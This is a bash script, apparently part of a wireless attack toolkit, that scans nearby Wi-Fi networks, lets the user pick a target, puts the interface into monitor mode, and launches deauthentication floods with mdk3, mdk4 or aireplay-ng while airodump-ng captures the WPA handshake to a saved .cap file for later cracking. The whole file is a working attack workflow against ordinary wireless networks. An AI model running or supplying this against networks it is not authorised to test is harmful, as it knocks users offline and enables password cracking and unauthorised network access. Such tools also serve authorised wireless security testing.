#!/bin/bash

function handshake_capture {

	clear

	echo -e "$CGN"
	echo "   _   _     _     _   _  ____   ____   _   _     _     _  __ _____                    "
	echo "  | | | |   / \   | \ | ||  _ \ / ___| | | | |   / \   | |/ /| ____|                   "
	echo "  | |_| |  / _ \  |  \| || | | |\___ \ | |_| |  / _ \  | ' / |  _|                     "
	echo "  |  _  | / ___ \ | |\  || |_| | ___) ||  _  | / ___ \ | . \ | |___                    "
	echo "  |_| |_|/_/   \_\|_| \_||____/ |____/ |_| |_|/_/   \_\|_|\_\|_____|                   "
	echo "                                 ____     _     ____  _____  _   _  ____   _____       "
	echo "                                / ___|   / \   |  _ \|_   _|| | | ||  _ \ | ____|  _   "
	echo "                               | |      / _ \  | |_) | | |  | | | || |_) ||  _|   (_)  "
	echo "                               | |___  / ___ \ |  __/  | |  | |_| ||  _ < | |___   _   "
	echo "                                \____|/_/   \_\|_|     |_|   \___/ |_| \_\|_____| (_)  "
	echo "                                                                                       "
	echo -e "\n         $CAMRK PAY ATTENTION TO THE HANDSHAKE CAPTURE WINDOW ! "
	echo -e " WE WILL ASK IF YOU GOT THE HANDSHAKE FILE AFTER THE WINDOW CLOSES "
	echo
	echo -e " $CGMRK Using '$AttackMode' For The Attack $CWE \n"

	echo -n " Press [Enter] Key To Continue ... "
	read -r continue

	echo "${bssid}" > "${TmpDIR}bl.txt"

	case $AttackMode in
	  mdk3)
			xterm +j -fg red -geometry "$XTermGeometry" -T "Mdk3 Attack" -e mdk3 "$Interface" d -b "${TmpDIR}bl.txt" -c "${channel}" > /dev/null 2>&1 &
			ProcessIdAttack=$!

			xterm +j -geometry "$XTermGeometry" -T "Capturing HandShake" -e airodump-ng -c "${channel}" -d "${bssid}" -w "${TmpDIR}HandShake" "$Interface" > /dev/null 2>&1 &
			ProcessIdCapture=$!

			sleep $TimeAttack && kill $ProcessIdAttack
			sleep $TimeCapture && kill $ProcessIdCapture
	  ;;
	  mdk4)
			xterm +j -fg red -geometry "$XTermGeometry" -T "Mdk4 Attack" -e mdk4 "$Interface" d -b "${TmpDIR}bl.txt" -c "${channel}" > /dev/null 2>&1 &
			ProcessIdAttack=$!

			xterm +j -geometry "$XTermGeometry" -T "Capturing HandShake" -e airodump-ng -c "${channel}" -d "${bssid}" -w "${TmpDIR}HandShake" "$Interface" > /dev/null 2>&1 &
			ProcessIdCapture=$!

			sleep $TimeAttack && kill $ProcessIdAttack
			sleep $TimeCapture && kill $ProcessIdCapture
	  ;;
	  aireplay)
			xterm +j -geometry "$XTermGeometry" -T "Capturing HandShake" -e airodump-ng -c "${channel}" -d "${bssid}" -w "${TmpDIR}HandShake" "$Interface" > /dev/null 2>&1 &
			ProcessIdCapture=$!

			sleep .5

			xterm +j -fg red -geometry "$XTermGeometry" -T "Aireplay Attack" -e sudo aireplay-ng -0 0 -a ${bssid} $Interface > /dev/null 2>&1 &
			ProcessIdAttack=$!

			sleep $TimeAttack && kill $ProcessIdAttack
			sleep $TimeCapture && kill $ProcessIdCapture
	  ;;
	esac

	sudo cp "${TmpDIR}HandShake-01.cap" "${DefaultHandShakeSave}HandShake-${bssid}.cap"
}

function explore_for_networks {

	clear

	echo -e "$CGN"
  echo "   _____               _                       _____                       "
  echo "  | ____|__  __ _ __  | |  ___   _ __  ___    |  ___|___   _ __            "
  echo "  |  _|  \ \/ /| '_ \ | | / _ \ | '__|/ _ \   | |_  / _ \ | '__|           "
  echo "  | |___  >  < | |_) || || (_) || |  |  __/   |  _|| (_) || |              "
  echo "  |_____|/_/\_\| .__/ |_| \___/ |_|   \___|   |_|   \___/ |_|              "
  echo "               |_| _   _        _                          _               "
  echo "                  | \ | |  ___ | |_ __      __ ___   _ __ | | __ ___   _   "
  echo "                  |  \| | / _ \| __|\ \ /\ / // _ \ | '__|| |/ // __| (_)  "
  echo "                  | |\  ||  __/| |_  \ V  V /| (_) || |   |   < \__ \  _   "
  echo "                  |_| \_| \___| \__|  \_/\_/  \___/ |_|   |_|\_\|___/ (_)  "
  echo "                                                                           "
	echo -e "$CWE"

	echo -n " Press [Enter] Key To Continue ... "
	read -r continue

	xterm +j -geometry "$XTermGeometry" -T "Exploring for targets" -e airodump-ng -w "${TmpDIR}nws" "$Interface" > /dev/null 2>&1

	targetline=$(awk '/(^Station[s]?|^Client[es]?)/{print NR}' < "${TmpDIR}nws-01.csv")
	targetline=$((targetline - 1))

	head -n "${targetline}" "${TmpDIR}nws-01.csv" &> "${TmpDIR}nws.csv"
	tail -n +"${targetline}" "${TmpDIR}nws-01.csv" &> "${TmpDIR}clts.csv"

	csvline=$(wc -l "${TmpDIR}nws.csv" 2> /dev/null | awk '{print $1}')

	if [ "${csvline}" -le 3 ]; then
		echo -e "\n No Networks Found "
		echo -n " Press [Enter] Key To Continue ... "
		read -r continue
		return 1
	fi

	i=0
	while IFS=, read -r exp_mac _ _ exp_channel _ exp_enc _ _ exp_power _ _ _ exp_idlength exp_essid _; do
		chars_mac=${#exp_mac}
		if [ "${chars_mac}" -ge 17 ]; then
			i=$((i+1))
			if [[ ${exp_power} -lt 0 ]]; then
				if [[ ${exp_power} -eq -1 ]]; then
					exp_power=0
				else
					exp_power=$((exp_power + 100))
				fi
			fi

			exp_power=$(echo "${exp_power}" | awk '{gsub(/ /,""); print}')
			exp_essid=${exp_essid:1:${exp_idlength}}

			if [[ ${exp_channel} =~ ${ValidChannels} ]]; then
				exp_channel=$(echo "${exp_channel}" | awk '{gsub(/ /,""); print}')
			else
				exp_channel=0
			fi

			if [[ "${exp_essid}" = "" ]] || [[ "${exp_channel}" = "-1" ]]; then
				exp_essid="(Hidden Network)"
			fi

			exp_enc=$(echo "${exp_enc}" | awk '{print $1}')

			echo -e "${exp_mac},${exp_channel},${exp_power},${exp_essid},${exp_enc}" >> "${TmpDIR}nws.txt"
		fi
	done < "${TmpDIR}nws.csv"

	sort -t "," -d -k 4 "${TmpDIR}nws.txt" > "${TmpDIR}wnws.txt"

	select_target
}

function select_target {

	clear

	echo -e "$CGN"
	echo "                     Select target :                    "
	echo
	echo "  N.         BSSID      CHANNEL  PWR   ENC    ESSID     "
	echo " ------------------------------------------------------ "
  echo -e "$CWE"

	i=0
	while IFS=, read -r exp_mac exp_channel exp_power exp_essid exp_enc; do

		i=$((i+1))

		if [ ${i} -le 9 ]; then
			sp1=" "
		else
			sp1=""
		fi

		if [[ ${exp_channel} -le 9 ]]; then
			sp2="  "
			if [[ ${exp_channel} -eq 0 ]]; then
				exp_channel="-"
			fi
		elif [[ ${exp_channel} -ge 10 ]] && [[ ${exp_channel} -lt 99 ]]; then
			sp2=" "
		else
			sp2=""
		fi

		if [[ "${exp_power}" = "" ]]; then
			exp_power=0
		fi

		if [[ ${exp_power} -le 9 ]]; then
			sp4=" "
		else
			sp4=""
		fi

		airodump_color="${CWE}"
		client=$(grep "${exp_mac}" < "${TmpDIR}clts.csv")
		if [ "${client}" != "" ]; then
			airodump_color="${CYW}"
			client="*"
			sp5=""
		else
			sp5=" "
		fi

		enc_length=${#exp_enc}
		if [ "${enc_length}" -gt 3 ]; then
			sp6=""
		elif [ "${enc_length}" -eq 0 ]; then
			sp6="    "
		else
			sp6=" "
		fi

		network_names[$i]=${exp_essid}
		channels[$i]=${exp_channel}
		macs[$i]=${exp_mac}
		encs[$i]=${exp_enc}
		echo -e "${airodump_color} ${sp1}${i})${client}  ${sp5}${exp_mac}  ${sp2}${exp_channel}    ${sp4}${exp_power}%   ${exp_enc}${sp6}   ${exp_essid}"
	done < "${TmpDIR}wnws.txt"

	while [[ ! ${selected_target_network} =~ ^[[:digit:]]+$ ]] || (( selected_target_network < 1 || selected_target_network > i )); do
	  echo -en "$CGN" "\n >" "$CWE"
		read -r selected_target_network
	done

	channel=${channels[${selected_target_network}]}
	bssid=${macs[${selected_target_network}]}
}

function phy_iface_finder {

	phy_iface=$(basename "$(readlink "/sys/class/net/$1/phy80211")" 2> /dev/null)

	echo -e "$phy_iface"
}

function phy_iface_band {

	if iw phy "$1" info 2> /dev/null | grep "5200 MHz" > /dev/null; then
		return 0
	fi

	return 1
}

function interface_selection {

	clear

  echo -e $CGN
  echo "   ___         _                __                                "
  echo "  |_ _| _ __  | |_  ___  _ __  / _|  __ _   ___  ___              "
  echo "   | | | '_ \ | __|/ _ \| '__|| |_  / _\` | / __|/ _ \            "
  echo "   | | | | | || |_|  __/| |   |  _|| (_| || (__|  __/             "
  echo "  |___||_| |_| \__|\___||_|   |_|   \__,_| \___|\___|             "
  echo "           ____         _              _    _                     "
  echo "          / ___|   ___ | |  ___   ___ | |_ (_)  ___   _ __    _   "
  echo "          \___ \  / _ \| | / _ \ / __|| __|| | / _ \ | '_ \  (_)  "
  echo "           ___) ||  __/| ||  __/| (__ | |_ | || (_) || | | |  _   "
  echo "          |____/  \___||_| \___| \___| \__||_| \___/ |_| |_| (_)  "
  echo "                                                                  "
  echo -e $CWE

	ifaces=$(ip link | grep -E "^[0-9]+" | cut -d ':' -f 2 | awk '{print $1}' | grep -E "^lo$" -v)
	option_counter=0

	for item in ${ifaces}; do
		option_counter=$((option_counter + 1))
		echo -ne " ${option_counter} - ${item}"
		Interface_menu_band=""
		Interface_menu_band+=" ${CBE}// ${CLPE}"
		phy_iface_band "$(phy_iface_finder "${item}")"
			case "$?" in
				"1")
					Interface_menu_band+="2.4Ghz"
				;;
				*)
					Interface_menu_band+="2.4Ghz, 5Ghz"
				;;
			esac
		echo -e "${Interface_menu_band} ${CWE} "
	done

  echo -en $CGN "\n >" $CWE
	read -r iface

	if [[ ! ${iface} =~ ^[[:digit:]]+$ ]] || (( iface < 1 || iface > option_counter )); then
		interface_selection
	else
		option_counter2=0
		for item2 in ${ifaces}; do
			option_counter2=$((option_counter2 + 1))
			if [[ "${iface}" = "${option_counter2}" ]]; then
				Interface=${item2}
				break
			fi
		done
	fi

  MonMode=$(iwconfig "$Interface" 2> /dev/null | grep Mode: | awk '{print $4}' | cut -d ':' -f 2)

	if [[ $MonMode != "Monitor" ]]; then
	  echo -e "$CWE" "\n Interface Is In ${TUD}Managed Mode${CWE}, Script Will Activate ${TUD}Monitor Mode${CWE} ... "
	  sleep 2 && sudo airmon-ng start $Interface > /dev/null 2>&1
	  interface_selection
	fi
}
